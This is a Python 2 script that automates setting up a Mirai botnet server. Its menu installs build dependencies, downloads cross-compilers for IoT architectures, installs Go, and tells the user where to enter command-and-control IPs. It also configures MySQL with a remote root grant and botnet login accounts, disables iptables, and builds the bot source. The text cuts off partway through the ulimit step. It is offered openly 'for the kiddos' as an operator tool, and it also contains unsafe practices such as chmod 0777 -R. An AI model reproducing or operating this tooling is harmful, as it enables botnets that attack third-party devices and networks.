#!/usr/bin/python

#   charge./switch's botnet helper
#   for the kiddos
#   contact: charge.#6666
#   website: theswitcharchive.com
#   IG: @switchnets


#import some hacks
import subprocess, time, sys, random, os


def run(cmd):
   subprocess.call(cmd, shell=True) # subprocess call so we can run hacker commands in the vps 
run('clear') # clear the screen :hahayes:

userinput = raw_input("""\x1b[37m

    \x1b[96mwelcome to big Mirai semi-auto setup
    made by charge./switch

    \x1b[96m1) \x1b[37mMirai Setup
    \x1b[96m2) \x1b[37mInformation

        
    \x1b[96mplease select an option (1 or 2): """) # main menu, userinput to pick an option

if userinput == "1":
    run('clear')
    mirai = raw_input("""

    \x1b[96m1) \x1b[37mInstall Mirai Dependencies
    \x1b[96m2) \x1b[37mDownload Mirai Compilers
    \x1b[96m3) \x1b[37mConfigure Mirai Compilers
    \x1b[96m4) \x1b[37mInstall Go v1.9.4
    \x1b[96m5) \x1b[37mWhere to change IPs in your source \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m6) \x1b[37mSetup MYSQL Databases \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m7) \x1b[37mSetup MYSQL Databases PART 2\x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m8) \x1b[37mStop & Restart Services
    \x1b[96m9) \x1b[37mBuild The Source
    \x1b[96m10) \x1b[37mUlimit
    \x1b[96m11) \x1b[37mScreen the CNC

    Press Q to quit
    Press B to go back

    please select an option: """)
    if mirai == "Q":
        exit()
    if mirai == "B":
        print("Returning to the main menu in 2 seconds.")
        for i in xrange(2,0,-1):
                sys.stdout.write(str(i)+' ') # countdown code
                sys.stdout.flush()
                time.sleep(1) # sleep so we dont kill ourselves :hahayes:
        run('clear')    
        userinput = raw_input("""\x1b[37m

        \x1b[96mwelcome to big Mirai semi-auto setup
        made by charge./switch

        \x1b[96m1) \x1b[37mMirai Setup
        \x1b[96m2) \x1b[37mInformation

            
        \x1b[96mplease select an option (1 or 2): """)

if userinput == "2":
    run ('clear') # i wonder what this does?
    information = raw_input("""

        \x1b[37mMade by \x1b[96mcharge./switch

        \x1b[37mContact:
        \x1b[96mDiscord: \x1b[37mcharge.#6666
        \x1b[96mInstagram: \x1b[37m@switchnets
        \x1b[96mWebsite: \x1b[37mtheswitcharchive.com
        \x1b[96mDiscord Server: \x1b[37mhttps://discord.gg/VfnEHZd

        \x1b[37mWould you like to return to the main menu? (y/n): """)
    if information == "y":
        print("Returning to the main menu in 2 seconds.")
        for i in xrange(2,0,-1):
                sys.stdout.write(str(i)+' ') # countdown code
                sys.stdout.flush()
                time.sleep(1) # sleep so we dont kill ourselves :hahayes:
        run('clear')    
        userinput = raw_input("""\x1b[37m

        \x1b[96mwelcome to big Mirai semi-auto setup
        made by charge./switch

        \x1b[96m1) \x1b[37mMirai Setup
        \x1b[96m2) \x1b[37mInformation

            
        \x1b[96mplease select an option (1 or 2): """)
    if information == "n":
        exit()


### MIRAI HACKS START HERE ###

#   1) Install Mirai Dependencies
#   2) Download Mirai Compilers
#   3) Configure Mirai Compilers
#   4) Install Go v1.9.4
#   5) Where to change IPs in your source
#   6) Setup MYSQL Databases (USER INPUT REQUIRED!)
#   7) MYSQL Databases PART 2 (USER INPUT REQUIRED!)
#   8) Stop & Restart Services
#   9) Build The Source
#   10) Ulimit
#   11) Screen the CNC

if mirai == "1":
    print("Installing Dependencies..")
    run('yum update -y')
    
    run('yum install epel-release -y')
    
    run('yum groupinstall "Development Tools" -y')
    
    run('yum install gmp-devel -y')
    
    run('ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10')
    
    run('yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y')
    time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    print("\x1b[32mDependencies Installed!\x1b[37m")
    print("Returning to the main menu in 2 seconds.")
    for i in xrange(2,0,-1):
            sys.stdout.write(str(i)+' ')
            sys.stdout.flush()
            time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    run('clear')    
    mirai = raw_input("""

    \x1b[96m1) \x1b[37mInstall Mirai Dependencies
    \x1b[96m2) \x1b[37mDownload Mirai Compilers
    \x1b[96m3) \x1b[37mConfigure Mirai Compilers
    \x1b[96m4) \x1b[37mInstall Go v1.9.4
    \x1b[96m5) \x1b[37mWhere to change IPs in your source \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m6) \x1b[37mSetup MYSQL Databases \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m7) \x1b[37mSetup MYSQL Databases PART 2\x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m8) \x1b[37mStop & Restart Services
    \x1b[96m9) \x1b[37mBuild The Source
    \x1b[96m10) \x1b[37mUlimit
    \x1b[96m11) \x1b[37mScreen the CNC

    Press Q to quit
    Press B to go back

    please select an option: """)
    if mirai == "Q":
        exit()
    if mirai == "B":
        print("Returning to the main menu in 2 seconds.")
        for i in xrange(2,0,-1):
                sys.stdout.write(str(i)+' ') # countdown code
                sys.stdout.flush()
                time.sleep(1) # sleep so we dont kill ourselves :hahayes:
        run('clear')    
        userinput = raw_input("""\x1b[37m

        \x1b[96mwelcome to big Mirai semi-auto setup
        made by charge./switch

        \x1b[96m1) \x1b[37mMirai Setup
        \x1b[96m2) \x1b[37mInformation

            
        \x1b[96mplease select an option (1 or 2): """)

if mirai == "2":
    print("Downloading Compilers..")
    time.sleep(1)
    print("making /xcompile dir")
    run('mkdir /etc/xcompile')
    time.sleep(1)
    print("downloading cc's")
    run('wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2')
    
    run('wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2')
    
    run('wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2')
    
    run('wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2')
    
    run('wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2')
    
    run('wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2')
    
    run('wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2')
    
    run('wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2')
    
    run('wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2')
    
    run('wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2')
    
    run('wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2')
    time.sleep(1)
    print("\x1b[32mCompilers Downloaded!\x1b[37m")
    print("Returning to the main menu in 2 seconds.")
    for i in xrange(2,0,-1):
            sys.stdout.write(str(i)+' ')
            sys.stdout.flush()
            time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    run('clear')    
    mirai = raw_input("""

    \x1b[96m1) \x1b[37mInstall Mirai Dependencies
    \x1b[96m2) \x1b[37mDownload Mirai Compilers
    \x1b[96m3) \x1b[37mConfigure Mirai Compilers
    \x1b[96m4) \x1b[37mInstall Go v1.9.4
    \x1b[96m5) \x1b[37mWhere to change IPs in your source \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m6) \x1b[37mSetup MYSQL Databases \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m7) \x1b[37mSetup MYSQL Databases PART 2\x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m8) \x1b[37mStop & Restart Services
    \x1b[96m9) \x1b[37mBuild The Source
    \x1b[96m10) \x1b[37mUlimit
    \x1b[96m11) \x1b[37mScreen the CNC

    Press Q to quit
    Press B to go back

    please select an option: """)
    if mirai == "Q":
        exit()
    if mirai == "B":
        print("Returning to the main menu in 2 seconds.")
        for i in xrange(2,0,-1):
                sys.stdout.write(str(i)+' ') # countdown code
                sys.stdout.flush()
                time.sleep(1) # sleep so we dont kill ourselves :hahayes:
        run('clear')    
        userinput = raw_input("""\x1b[37m

        \x1b[96mwelcome to big Mirai semi-auto setup
        made by charge./switch

        \x1b[96m1) \x1b[37mMirai Setup
        \x1b[96m2) \x1b[37mInformation

            
        \x1b[96mplease select an option (1 or 2): """)

if mirai == "3":
    print("Configuring Compilers.. Please wait..")
    time.sleep(1)
    print("cd into xcompile (which probably wont work but we do it anyways :hahayes:)")
    run('cd /etc/xcompile')
    time.sleep(1)
    print("cleaning old xcompile folder")
    run('rm -rf /etc/xcompile/*')
    print("started tarring cc's")
    time.sleep(1)
    run('tar -jxf cross-compiler-i586.tar.bz2')
    
    run('tar -jxf cross-compiler-m68k.tar.bz2')
    
    run('tar -jxf cross-compiler-mips.tar.bz2')
    
    run('tar -jxf cross-compiler-mipsel.tar.bz2')
    
    run('tar -jxf cross-compiler-powerpc.tar.bz2')
    
    run('tar -jxf cross-compiler-sh4.tar.bz2')
    
    run('tar -jxf cross-compiler-sparc.tar.bz2')
    
    run('tar -jxf cross-compiler-armv4l.tar.bz2')
    
    run('tar -jxf cross-compiler-armv5l.tar.bz2')
    
    run('tar -jxf cross-compiler-armv6l.tar.bz2')
    
    run('tar -jxf cross-compiler-armv7l.tar.bz2')
    print("removing all .tar")
    run('rm -rf *.tar.bz2')
    print("renaming cc's")
    run('mv cross-compiler-i586 i586')
    
    run('mv cross-compiler-m68k m68k')
    
    run('mv cross-compiler-mips mips')
    
    run('mv cross-compiler-mipsel mipsel')
    
    run('mv cross-compiler-powerpc powerpc')
    
    run('mv cross-compiler-sh4 sh4')
    
    run('mv cross-compiler-sparc sparc')
    
    run('mv cross-compiler-armv4l armv4l')
    
    run('mv cross-compiler-armv5l armv5l')
    
    run('mv cross-compiler-armv6l armv6l')
    
    run('mv cross-compiler-armv7l armv7l')
    time.sleep(1)
    print("moving cc's into /xcompile")
    run('mv i586 /etc/xcompile')
    run('mv m68k /etc/xcompile')
    run('mv mips /etc/xcompile')
    run('mv mipsel /etc/xcompile')
    run('mv powerpc /etc/xcompile')
    run('mv sh4 /etc/xcompile')
    run('mv sparc /etc/xcompile')
    run('mv armv4l /etc/xcompile')
    run('mv armv5l /etc/xcompile')
    run('mv armv6l /etc/xcompile')
    run('mv armv7l /etc/xcompile')
    time.sleep(1)
    print("\x1b[32mCompilers Downloaded!\x1b[37m")
    print("Returning to the main menu in 3 seconds.")
    for i in xrange(3,0,-1):
            sys.stdout.write(str(i)+' ')
            sys.stdout.flush()
            time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    run('clear')    
    mirai = raw_input("""

    \x1b[96m1) \x1b[37mInstall Mirai Dependencies
    \x1b[96m2) \x1b[37mDownload Mirai Compilers
    \x1b[96m3) \x1b[37mConfigure Mirai Compilers
    \x1b[96m4) \x1b[37mInstall Go v1.9.4
    \x1b[96m5) \x1b[37mWhere to change IPs in your source \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m6) \x1b[37mSetup MYSQL Databases \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m7) \x1b[37mSetup MYSQL Databases PART 2\x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m8) \x1b[37mStop & Restart Services
    \x1b[96m9) \x1b[37mBuild The Source
    \x1b[96m10) \x1b[37mUlimit
    \x1b[96m11) \x1b[37mScreen the CNC

    Press Q to quit
    Press B to go back

    please select an option: """)
    if mirai == "Q":
        exit()
    if mirai == "B":
        print("Returning to the main menu in 2 seconds.")
        for i in xrange(2,0,-1):
                sys.stdout.write(str(i)+' ') # countdown code
                sys.stdout.flush()
                time.sleep(1) # sleep so we dont kill ourselves :hahayes:
        run('clear')    
        userinput = raw_input("""\x1b[37m

        \x1b[96mwelcome to big Mirai semi-auto setup
        made by charge./switch

        \x1b[96m1) \x1b[37mMirai Setup
        \x1b[96m2) \x1b[37mInformation

            
        \x1b[96mplease select an option (1 or 2): """)

if mirai == "4":
    print("Installing Go v1.9.4..")
    time.sleep(1)
    #run('sh go.sh')
    time.sleep(1)
    os.system('wget https://dl.google.com/go/go1.9.4.linux-amd64.tar.gz -q')
    print("wgetting go")
    os.system('tar -xzf go1.9.4.linux-amd64.tar.gz')
    print("tarring")
    os.system('rm -rf /usr/local/go/*')
    print("cleaning up old go folder")
    os.system('mv go /usr/local')
    print("moving go folder into /local")
    os.system('export GOROOT=/usr/local/go')
    print("export GOROOT")
    os.system('export GOPATH=$HOME/Projects/Proj1')
    print("export GOPATH")
    os.system('export PATH=$GOPATH/bin:$GOROOT/bin:$PATH')
    print("export PATH")
    os.system('go version')
    print("go version")
    os.system('go env')
    print("go env")
    os.system('cd ~/')
    time.sleep(1)
    print("\x1b[32mGo v1.9.4 Installed!\x1b[37m")
    print("Returning to the main menu in 2 seconds.")
    for i in xrange(2,0,-1):
            sys.stdout.write(str(i)+' ')
            sys.stdout.flush()
            time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    run('clear')    
    mirai = raw_input("""

    \x1b[96m1) \x1b[37mInstall Mirai Dependencies
    \x1b[96m2) \x1b[37mDownload Mirai Compilers
    \x1b[96m3) \x1b[37mConfigure Mirai Compilers
    \x1b[96m4) \x1b[37mInstall Go v1.9.4
    \x1b[96m5) \x1b[37mWhere to change IPs in your source \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m6) \x1b[37mSetup MYSQL Databases \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m7) \x1b[37mSetup MYSQL Databases PART 2\x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m8) \x1b[37mStop & Restart Services
    \x1b[96m9) \x1b[37mBuild The Source
    \x1b[96m10) \x1b[37mUlimit
    \x1b[96m11) \x1b[37mScreen the CNC

    Press Q to quit
    Press B to go back

    please select an option: """)
    if mirai == "Q":
        exit()
    if mirai == "B":
        print("Returning to the main menu in 2 seconds.")
        for i in xrange(2,0,-1):
                sys.stdout.write(str(i)+' ') # countdown code
                sys.stdout.flush()
                time.sleep(1) # sleep so we dont kill ourselves :hahayes:
        run('clear')    
        userinput = raw_input("""\x1b[37m

        \x1b[96mwelcome to big Mirai semi-auto setup
        made by charge./switch

        \x1b[96m1) \x1b[37mMirai Setup
        \x1b[96m2) \x1b[37mInformation

            
        \x1b[96mplease select an option (1 or 2): """)

if mirai == "5":
    print("")
    print("""

    \x1b[31mHere is where you need to change the IPs in your source code. Do this now.

    \x1b[96mCHANGE IP(s) IN /bot/includes.h -> DO NOT CHANGE THE FAKE CNC IP
    \x1b[96mCHANGE IP(s) IN /scanListen.go
    \x1b[96mCHANGE IP(s) IN /dlr/main.c -> For example your server ip is 127.0.0.1 the format should be (127,0,0,1) replace the . with , 
    \x1b[96mCHANGE IP(s) IN /loader/src/headers/config.h\x1b[37m
        
    Press B to go back

    please select an option: """)
    if mirai == "B":
        run('clear')    
        mirai = raw_input("""

        \x1b[96m1) \x1b[37mInstall Mirai Dependencies
        \x1b[96m2) \x1b[37mDownload Mirai Compilers
        \x1b[96m3) \x1b[37mConfigure Mirai Compilers
        \x1b[96m4) \x1b[37mInstall Go v1.9.4
        \x1b[96m5) \x1b[37mWhere to change IPs in your source \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
        \x1b[96m6) \x1b[37mSetup MYSQL Databases \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
        \x1b[96m7) \x1b[37mSetup MYSQL Databases PART 2\x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
        \x1b[96m8) \x1b[37mStop & Restart Services
        \x1b[96m9) \x1b[37mBuild The Source
        \x1b[96m10) \x1b[37mUlimit
        \x1b[96m11) \x1b[37mScreen the CNC

        Press Q to quit
        Press B to go back

        please select an option: """)
        if mirai == "Q":
            exit()
        if mirai == "B":
            print("Returning to the main menu in 2 seconds.")
            for i in xrange(2,0,-1):
                    sys.stdout.write(str(i)+' ') # countdown code
                    sys.stdout.flush()
                    time.sleep(1) # sleep so we dont kill ourselves :hahayes:
            run('clear')    
            userinput = raw_input("""\x1b[37m

            \x1b[96mwelcome to big Mirai semi-auto setup
            made by charge./switch

            \x1b[96m1) \x1b[37mMirai Setup
            \x1b[96m2) \x1b[37mInformation

                
            \x1b[96mplease select an option (1 or 2): """)

if mirai == "6":
    mysql = raw_input("""

        \x1b[31mNOW WE NEED TO SETUP MYSQLLLL
        \x1b[31mSO TO DO DO DO DO DODO DIS, WE NEEDA RUN A FEW COMMANDS, 
        \x1b[31mILL RUN EM FOR U, UR TOO STUPID LMFAO

        \x1b[31mwhen the first two commands have been ran, Mysql will ask you for a password,
        \x1b[96mhowever because you have not set one yet, \x1b[31msimply press enter.

        \x1b[96mafter that, \x1b[31mMysql will ask you if you want to set a root password, type "Y" and press enter.
        \x1b[96mthen, \x1b[31mMysql will ask you to input a password, \x1b[96minput any password you like however,
        \x1b[31mMAKE SURE YOUR MYSQL PASSWORD IS THE SAME AS THE PASSWORD IN THE main.go OF YOUR SOURCE (For Mana it is m.go)

        \x1b[96mFor example, if your mysql password is \x1b[31m"hack$12!" \x1b[96mthen \x1b[31myour main.go should have this as the DatabasePass, like this:

            \x1b[96mconst DatabasePass string   = "hack$12!"    

        \x1b[96msee? simple. after you have inputted your password twice, \x1b[31mMysql will start asking you some questions,
        such as, \x1b[31m"remove anonymous users", simply press enter on all of these. \x1b[96m(feel free to copy this if you think you will forget)
        
        \x1b[31mPress enter to acknowledge what you have to do, and the script will start to run the first two commands: """)
    print("")
    print("\x1b[31mRunning the first two commands in 5 seconds!\x1b[37m")
    for i in xrange(5,0,-1):
            sys.stdout.write(str(i)+' ') # countdown code
            sys.stdout.flush()
            time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    run('service mysqld start')
    run('mysql_secure_installation')
    time.sleep(1)
    print("Returning to the main menu in 2 seconds.")
    for i in xrange(2,0,-1):
            sys.stdout.write(str(i)+' ') # countdown code
            sys.stdout.flush()
            time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    run('clear')    
    mirai = raw_input("""

    \x1b[96m1) \x1b[37mInstall Mirai Dependencies
    \x1b[96m2) \x1b[37mDownload Mirai Compilers
    \x1b[96m3) \x1b[37mConfigure Mirai Compilers
    \x1b[96m4) \x1b[37mInstall Go v1.9.4
    \x1b[96m5) \x1b[37mWhere to change IPs in your source \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m6) \x1b[37mSetup MYSQL Databases \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m7) \x1b[37mSetup MYSQL Databases PART 2\x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m8) \x1b[37mStop & Restart Services
    \x1b[96m9) \x1b[37mBuild The Source
    \x1b[96m10) \x1b[37mUlimit
    \x1b[96m11) \x1b[37mScreen the CNC

    Press Q to quit
    Press B to go back

    please select an option: """)
    if mirai == "Q":
        exit()
    if mirai == "B":
        print("Returning to the main menu in 2 seconds.")
        for i in xrange(2,0,-1):
                sys.stdout.write(str(i)+' ') # countdown code
                sys.stdout.flush()
                time.sleep(1) # sleep so we dont kill ourselves :hahayes:
        run('clear')    
        userinput = raw_input("""\x1b[37m

        \x1b[96mwelcome to big Mirai semi-auto setup
        made by charge./switch

        \x1b[96m1) \x1b[37mMirai Setup
        \x1b[96m2) \x1b[37mInformation

            
        \x1b[96mplease select an option (1 or 2): """)

if mirai == "7":

    run('clear')
    print("Theres gonna be a lot of information to read next, you might have to scroll up to read it all")
    for i in xrange(5,0,-1):
            sys.stdout.write(str(i)+' ') # countdown code
            sys.stdout.flush()
            time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    run('clear')
    mysqlpt2 = raw_input("""

        \x1b[96mwelcome back, hopeuflly you did that right, if you have any issues or ur not sure, add me on Discord and ill help
        \x1b[31mDiscord: charge.#6666

        \x1b[96mnow, lets finish up with Mysql
        Next, im going to run another command for you, \x1b[31mbut this is the hardest part, so hopefully you can get through it:

        \x1b[96mFirst, \x1b[31mim going to be running this command: "mysql -u root -p", \x1b[96mthis will start up Mysql and get it ready for commands
        \x1b[31myou should see something like this when it has been ran:

                \x1b[96mmysql>

        when you see this, \x1b[31myou're going to have to go into the "MySQL_Tables.txt" 
        file in the Original "Mirai Semi Auto Setup" folder.

        \x1b[96monce inside of there, \x1b[31mat the top there is this line:

                \x1b[96mGRANT ALL ON *.* to root@'%' IDENTIFIED BY 'YourMySQLPasswordHere';

        \x1b[31mCHANGE THE "YourMySQLPasswordHere" TO YOUR MYSQL PASSWORD WE SET EARLIER. Example:

                \x1b[96mGRANT ALL ON *.* to root@'%' IDENTIFIED BY 'hack$12!';
        
        \x1b[31mnext, there are these two lines also near the top:

                \x1b[96mCREATE DATABASE YourSourceName;
                \x1b[96muse YourSourceName;

        \x1b[31mchange the "YourSourceName" to whatever your source is, Example:

                \x1b[96mCREATE DATABASE Mana;
                \x1b[96muse Mana;

        \x1b[31mIf you dont know what your source table name is, you can check by going into the main.go again, it will look like this:

                \x1b[96mconst DatabaseTable string  = "SourceName"
        \x1b[96mExample:
                \x1b[96mconst DatabaseTable string  = "Mana"

        \x1b[31mOk, after that, this is the easy bit, we need to set our username and password for the login to the botnet:

        \x1b[31mat the bottom of the tables, there is this line:

                \x1b[96mINSERT INTO users VALUES (NULL, 'USERNAME', 'PASSWORD', 0, 0, 0, 0, -1, 1, 30, '');

        \x1b[31mObviously, change the USERNAME and PASSWORD to whatever you want it to be. Example:

                \x1b[96mINSERT INTO users VALUES (NULL, 'switch', 'hack$12!', 0, 0, 0, 0, -1, 1, 30, '');

        \x1b[96mAIGHT SO WE NEARLY DONEEEEEE
        \x1b[96mnow you have changed all of that, copy everything from the "exit;" at the bottom all the way up to the top
        then, go back to the original "mysql>" and right click and press paste, if you did it all right, you should just have to press enter
        then it will say "Bye". MySQL has been setup successfully. 
        Once again, if you think you did something wrong feel free to add me on Discord for help. 
        You will be able to continue onto the "Stop & Restart Services" after this

        \x1b[96mNow, please enter your \x1b[31mMySQL password, \x1b[96mso the script can run the first command: """)
    print("")
    print("\x1b[31mRunning the command in 5 seconds!\x1b[37m")
    for i in xrange(5,0,-1):
            sys.stdout.write(str(i)+' ') # countdown code
            sys.stdout.flush()
            time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    run('mysql -u root -p'+ mysqlpt2)
    time.sleep(1)
    print("Returning to the main menu in 2 seconds.")
    for i in xrange(2,0,-1):
            sys.stdout.write(str(i)+' ') # countdown code
            sys.stdout.flush()
            time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    run('clear')    
    mirai = raw_input("""

    \x1b[96m1) \x1b[37mInstall Mirai Dependencies
    \x1b[96m2) \x1b[37mDownload Mirai Compilers
    \x1b[96m3) \x1b[37mConfigure Mirai Compilers
    \x1b[96m4) \x1b[37mInstall Go v1.9.4
    \x1b[96m5) \x1b[37mWhere to change IPs in your source \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m6) \x1b[37mSetup MYSQL Databases \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m7) \x1b[37mSetup MYSQL Databases PART 2\x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m8) \x1b[37mStop & Restart Services
    \x1b[96m9) \x1b[37mBuild The Source
    \x1b[96m10) \x1b[37mUlimit
    \x1b[96m11) \x1b[37mScreen the CNC

    Press Q to quit
    Press B to go back

    please select an option: """)
    if mirai == "Q":
        exit()
    if mirai == "B":
        print("Returning to the main menu in 2 seconds.")
        for i in xrange(2,0,-1):
                sys.stdout.write(str(i)+' ') # countdown code
                sys.stdout.flush()
                time.sleep(1) # sleep so we dont kill ourselves :hahayes:
        run('clear')    
        userinput = raw_input("""\x1b[37m

        \x1b[96mwelcome to big Mirai semi-auto setup
        made by charge./switch

        \x1b[96m1) \x1b[37mMirai Setup
        \x1b[96m2) \x1b[37mInformation

            
        \x1b[96mplease select an option (1 or 2): """)

if mirai == "8":
    print("\x1b[96mRestarting & Stopping Services..")
    time.sleep(1)
    run('service iptables stop')
    run('service httpd restart')
    run('service mysqld restart')
    print("\x1b[32mFinished!\x1b[37m")
    time.sleep(1)
    print("Returning to the main menu in 2 seconds.")
    for i in xrange(2,0,-1):
            sys.stdout.write(str(i)+' ') # countdown code
            sys.stdout.flush()
            time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    run('clear')    
    mirai = raw_input("""

    \x1b[96m1) \x1b[37mInstall Mirai Dependencies
    \x1b[96m2) \x1b[37mDownload Mirai Compilers
    \x1b[96m3) \x1b[37mConfigure Mirai Compilers
    \x1b[96m4) \x1b[37mInstall Go v1.9.4
    \x1b[96m5) \x1b[37mWhere to change IPs in your source \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m6) \x1b[37mSetup MYSQL Databases \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m7) \x1b[37mSetup MYSQL Databases PART 2\x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m8) \x1b[37mStop & Restart Services
    \x1b[96m9) \x1b[37mBuild The Source
    \x1b[96m10) \x1b[37mUlimit
    \x1b[96m11) \x1b[37mScreen the CNC

    Press Q to quit
    Press B to go back

    please select an option: """)
    if mirai == "Q":
        exit()
    if mirai == "B":
        print("Returning to the main menu in 2 seconds.")
        for i in xrange(2,0,-1):
                sys.stdout.write(str(i)+' ') # countdown code
                sys.stdout.flush()
                time.sleep(1) # sleep so we dont kill ourselves :hahayes:
        run('clear')    
        userinput = raw_input("""\x1b[37m

        \x1b[96mwelcome to big Mirai semi-auto setup
        made by charge./switch

        \x1b[96m1) \x1b[37mMirai Setup
        \x1b[96m2) \x1b[37mInformation

            
        \x1b[96mplease select an option (1 or 2): """)

if mirai == "9":
    build = raw_input("""\x1b[96mNow the script will build your net. \x1b[31mThis might take a while, be patient

        \x1b[31mPUT YOUR MIRAI FILES IN THE VPS NOW\x1b[96m

        \x1b[96mPress enter and the script will start to build your source: """)
    print("")
    print("Building your source in 5 seconds.")
    for i in xrange(5,0,-1):
        sys.stdout.write(str(i)+' ') # countdown code
        sys.stdout.flush()
        time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    run('cd ~/')
    run('chmod 0777 * -R')
    print("\x1b[31mBuilding now!\x1b[37m")
    run('sh build.sh')
    time.sleep(1)
    print("\x1b[32mFinished! Hopefully there were no \x1b[31merrors\x1b[32m If there was, your source is broken.")
    print("Returning to the main menu in 5 seconds.")
    for i in xrange(5,0,-1):
            sys.stdout.write(str(i)+' ') # countdown code
            sys.stdout.flush()
            time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    run('clear')    
    mirai = raw_input("""

    \x1b[96m1) \x1b[37mInstall Mirai Dependencies
    \x1b[96m2) \x1b[37mDownload Mirai Compilers
    \x1b[96m3) \x1b[37mConfigure Mirai Compilers
    \x1b[96m4) \x1b[37mInstall Go v1.9.4
    \x1b[96m5) \x1b[37mWhere to change IPs in your source \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m6) \x1b[37mSetup MYSQL Databases \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m7) \x1b[37mSetup MYSQL Databases PART 2\x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m8) \x1b[37mStop & Restart Services
    \x1b[96m9) \x1b[37mBuild The Source
    \x1b[96m10) \x1b[37mUlimit
    \x1b[96m11) \x1b[37mScreen the CNC

    Press Q to quit
    Press B to go back

    please select an option: """)
    if mirai == "Q":
        exit()
    if mirai == "B":
        print("Returning to the main menu in 2 seconds.")
        for i in xrange(2,0,-1):
                sys.stdout.write(str(i)+' ') # countdown code
                sys.stdout.flush()
                time.sleep(1) # sleep so we dont kill ourselves :hahayes:
        run('clear')    
        userinput = raw_input("""\x1b[37m

        \x1b[96mwelcome to big Mirai semi-auto setup
        made by charge./switch

        \x1b[96m1) \x1b[37mMirai Setup
        \x1b[96m2) \x1b[37mInformation

            
        \x1b[96mplease select an option (1 or 2): """)

if mirai =="10":
    ulimit = raw_input("""
        \x1b[96mOk, now you're going to Ulimit, \x1b[31mthe script will run a command which will open up a nano terminal

        when this happens, use your down arrow key to scroll all thr way down to the bottom

        scroll down and change the 1024 to 999999 (use your arrow keys to move around)
        THEN SAVE IT by holding down CTRL, then pressing X, then pressing Y, then pressing ENTER.
        
        \x1b[96mPress enter to acknowledge what you have to do and the script will run the command: """)
    print("\x1b[31mRunning command in 5 seconds.\x1b[37m")
    for i in xrange(5,0,-1):
        sys.stdout.write(str(i)+' ') # countdown code
        sys.stdout.flush()
        time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    run('nano /usr/include/bits/typesizes.h')
    run('ulimit -n999999; ulimit -u999999; ulimit -e999999')
    time.sleep(1)
    print("Returning to the main menu in 2 seconds.")
    for i in xrange(2,0,-1):
            sys.stdout.write(str(i)+' ') # countdown code
            sys.stdout.flush()
            time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    run('clear')    
    mirai = raw_input("""

    \x1b[96m1) \x1b[37mInstall Mirai Dependencies
